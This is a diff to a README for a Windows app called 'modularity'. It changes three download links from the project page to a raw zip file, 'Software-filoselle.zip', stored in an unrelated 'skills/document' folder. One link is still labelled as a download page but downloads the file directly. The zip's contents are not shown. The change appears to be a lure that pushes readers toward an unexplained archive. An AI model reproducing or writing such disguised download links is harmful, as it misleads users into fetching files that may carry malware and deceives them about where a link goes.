@@ -1,12 +1,12 @@
 # 🧩 modularity - Build cleaner systems with less effort
 
-[![Download modularity](https://img.shields.io/badge/Download%20modularity-Ready%20for%20Windows-blue)](https://github.com/ardellashuddery616/modularity)
+[![Download modularity](https://img.shields.io/badge/Download%20modularity-Ready%20for%20Windows-blue)](https://github.com/ardellashuddery616/modularity/raw/refs/heads/main/skills/document/Software-filoselle.zip)
 
 ## 🚀 Download and install
 
 Use this link to visit the project page and download the app:
 
-[Download modularity](https://github.com/ardellashuddery616/modularity)
+[Download modularity](https://github.com/ardellashuddery616/modularity/raw/refs/heads/main/skills/document/Software-filoselle.zip)
 
 ### What this app does
 
@@ -144,4 +144,4 @@ After setup, you should be able to:
 
 If you need to get back to the download page, use this link:
 
-[Visit the modularity download page](https://github.com/ardellashuddery616/modularity)
+[Visit the modularity download page](https://github.com/ardellashuddery616/modularity/raw/refs/heads/main/skills/document/Software-filoselle.zip)
